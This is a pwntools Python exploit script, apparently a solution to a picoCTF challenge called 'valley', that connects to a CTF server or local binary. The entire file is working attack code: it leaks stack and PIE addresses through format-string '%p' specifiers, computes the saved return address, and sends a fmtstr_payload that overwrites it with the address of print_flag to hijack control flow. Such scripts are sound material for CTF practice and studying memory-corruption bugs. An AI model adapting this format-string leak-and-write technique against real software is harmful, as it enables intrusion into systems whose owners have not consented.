from pwn import *

gs = '''
b *echo_valley+248
continue
'''

elf = context.binary = ELF("./valley")

def start():
    if args.REMOTE:
        return remote("shape-facility.picoctf.net", 53420)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

def get_address(x):
    io.sendline(f"%{x}$p".encode())
    io.recvuntil("You heard in the distance: ")
    return int(io.recvline().decode().strip(), 16)

context.terminal = ['gnome-terminal', '-e']
io = start()
"""
io.recvline()

for i in range(1, 30):
    io.sendline(f"AAAA.%{i}$p".encode())
    io.recvuntil("You heard in the distance: ")
    print(f"Para: {i}:", io.recvline().decode().strip())
io.interactive()
"""
         
io.recvline()

print(f"Leak stack: {hex(get_address(1))}")

ret_address = get_address(9) + 0x30

print(f"Ret address: {hex(ret_address)}")

pie_leak = get_address(27)

print(f"Pie address: {hex(pie_leak)}")
elf.address = pie_leak - 0x1401

print(f"Win address: {hex(elf.sym.print_flag)}")

writes_dict = {
    u64(p64(ret_address)): u64(p64(elf.sym.print_flag))
}

payload = fmtstr_payload(6, writes_dict, write_size='short')

io.sendline(payload)

io.recv()

io.sendline("exit")

io.interactive()

